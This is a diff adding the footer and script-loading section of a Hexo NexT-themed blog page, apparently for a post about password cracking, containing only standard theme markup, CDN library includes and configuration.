+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">187k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:19</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2022/08/17/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
